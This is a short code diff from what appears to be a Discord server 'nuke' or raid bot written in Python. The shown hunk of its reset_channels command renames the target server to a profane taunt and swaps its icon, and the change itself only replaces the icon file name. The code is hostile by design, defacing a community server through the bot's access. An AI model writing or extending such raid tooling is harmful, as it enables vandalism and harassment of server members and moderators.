@@ -17,7 +17,7 @@ async def reset_channels(ctx):
     guild = ctx.guild
     try:
         await guild.edit(name="FUCKED BY NC IHR BITCHES!")
-        with open("icon_nuke.jpeg", "rb") as icon_file:
+        with open("vsb_icon.jpg", "rb") as icon_file:
             await guild.edit(icon=icon_file.read())
         print("✅ Servername und Icon geändert.")
     except Exception as e:
